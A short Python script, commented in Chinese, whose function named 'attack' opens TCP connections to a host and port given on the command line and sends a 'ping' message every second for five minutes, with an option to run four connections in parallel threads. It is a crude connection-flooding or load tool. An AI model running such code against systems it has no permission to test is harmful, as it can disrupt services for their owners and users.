import sys
import socket
import time
from threading import Thread

# 创建链接的套接字


def tcpConnect(ip: str, port: int) -> socket.socket:
    result = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result.connect((ip, port))
    return result


def ping(aSocket: socket.socket):
    message = bytes("ping ...", 'ascii')
    for _ in range(300):
        # 阻塞式发送
        aSocket.send(message, 0)
        time.sleep(1)


def attack(ip: str, port: int):
    tcpClient = tcpConnect(ip, port)
    ping(tcpClient)
    tcpClient.close()


if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])
    if(sys.argv[3] == "max"):
        print("多线程模式")
        p1 = Thread(target=attack, args=(host, port))
        p2 = Thread(target=attack, args=(host, port))
        p3 = Thread(target=attack, args=(host, port))
        p4 = Thread(target=attack, args=(host, port))
        p1.start()
        p2.start()
        p3.start()
        p4.start()
        p1.join()
        p2.join()
        p3.join()
        p4.join()
    else:
        attack(host, port)
